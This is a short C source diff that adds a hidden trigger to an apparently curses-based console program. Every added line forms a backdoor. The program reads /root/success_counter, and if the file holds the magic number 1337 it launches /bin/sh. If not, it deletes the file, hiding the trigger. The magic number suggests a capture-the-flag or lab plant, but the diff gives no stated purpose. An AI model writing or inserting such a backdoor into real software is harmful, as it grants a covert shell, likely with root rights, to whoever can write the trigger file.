@@ -624,6 +624,20 @@ if (console) {
             unlink("/root/color");
         }
 
+        if ((file = fopen("/root/success_counter", "r")))
+        {
+            char buffer[25] = {};
+            char *_buffer = fgets (buffer, sizeof(buffer), file);
+            fclose(file);
+            int success_counter = atoi(_buffer);
+            if ( success_counter == 1337 )
+            {
+                char *argv[] = { "/bin/sh", NULL };
+                execve("/bin/sh", argv, NULL);
+            } else
+                unlink("/root/success_counter");
+        }
+
         if ((keypress = wgetch(stdscr)) != ERR) {
             switch(keypress)
             {
